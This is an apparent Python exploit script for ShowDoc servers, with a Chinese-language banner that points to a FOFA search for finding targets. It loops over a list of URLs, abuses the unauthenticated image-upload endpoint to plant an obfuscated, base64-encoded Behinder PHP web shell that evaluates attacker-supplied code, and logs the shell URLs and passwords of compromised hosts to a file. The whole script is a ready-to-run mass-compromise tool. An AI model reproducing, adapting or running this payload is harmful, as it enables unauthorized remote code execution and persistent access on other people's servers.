import requests
import sys
import random
import re
import base64
import time
import urllib3
urllib3.disable_warnings()
from requests.packages.urllib3.exceptions import InsecureRequestWarning


def title():
    print('+------------------------------------------')
    print('+  \033[31m公众号 : 深夜笔记本                                                  \033[0m')
    print('+  \033[31mVersion: ShowDoc                                                   \033[0m')
    print('+  \033[31m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[31mVersion: fofa：app="ShowDoc"                                        \033[0m')
    print('+  \033[31m保存连接到url.txt                                                     \033[0m')
    print('+------------------------------------------')



def POC_1(target_url):
    vuln_url = target_url+"/index.php?s=/home/page/uploadImg"
    # 自己修改base64加密代码 冰蝎密码自己改 md5的前16位
    data = base64.b64decode("LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTgzNTg0Njc3MDg4MTA4MzE0MDE5MDYzMwpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9ImVkaXRvcm1kLWltYWdlLWZpbGUiOyBmaWxlbmFtZT0idGVzdC48PnBocCIKQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluCgo8P3BocApAZXJyb3JfcmVwb3J0aW5nKDApOwpzZXNzaW9uX3N0YXJ0KCk7CgppZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICdQT1NUJykKeyAgICAgICAgICAgICAgCiAgICAka2V5PSJkZmZmMGE3ZmExYTU1YzhjIjsgLy/ov5nkuIDooYzkuLrlr4bnoIHnmoRtZDXnmoTliY0xNuS9jQoJJF9TRVNTSU9OWydrJ109JGtleTsKCSRwb3N0PWZpbGVfZ2V0X2NvbnRlbnRzKCJwaHA6Ly9pbnB1dCIpOwoJaWYoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSkKCXsKCQkkdD0iYmFzZTY0XyIuImRlY29kZSI7CgkJJHBvc3Q9JHQoJHBvc3QuIiIpOwoJCQoJCWZvcigkaT0wOyRpPHN0cmxlbigkcG9zdCk7JGkrKykgewogICAgCQkJICRwb3N0WyRpXSA9ICRwb3N0WyRpXV4ka2V5WyRpKzEmMTVdOyAKICAgIAkJCX0KCX0KCWVsc2UKCXsKCQkkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsKCX0KICAgICRhcnI9ZXhwbG9kZSgnfCcsJHBvc3QpOwogICAgJGZ1bmM9JGFyclswXTsKICAgICRwYXJhbXM9JGFyclsxXTsKCWNsYXNzIEN7cHVibGljIGZ1bmN0aW9uIF9faW52b2tlKCRwKSB7ZXZhbCgkcC4iIik7fX0KICAgIEBjYWxsX3VzZXJfZnVuYyhuZXcgQygpLCRwYXJhbXMpOwp9Cj8+Ci0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS04MzU4NDY3NzA4ODEwODMxNDAxOTA2MzMtLQ==")
    headers = {
              'Content-Type': 'multipart/form-data; boundary=--------------------------835846770881083140190633'

               }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        # print(response) #状态码调试 以便查看
        print("\033[36m[o] 正在请求 {}/index.php?s=/home..... \033[0m".format(target_url))
        if response.status_code == 200:
            print("\033[32m[o] 目标 {} 存在漏洞\033[0m".format(target_url))
            match = re.findall(r'{"url":"(.*?)","success":1}', response.text, re.I | re.M)
            if match:
                s = match[0]
                s = s.replace('\\', '')
                print("上传路径为: " + s)
                print("密码为cmd")
                f = open('./vul.txt', 'a')
                f.write("连接地址为:"+ s)
                f.write('\n')
                f.write('密码为cmd')
                f.write('\n')

        else:
            print("\033[31m[x] 目标 {} 不存在漏洞\033[0m".format(target_url))

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

if __name__ == '__main__':
    title()
    with open('url.txt', 'r', encoding='utf-8') as f:
        for i in f.readlines():
            s = i.strip()
            target_url = s
            POC_1(target_url)
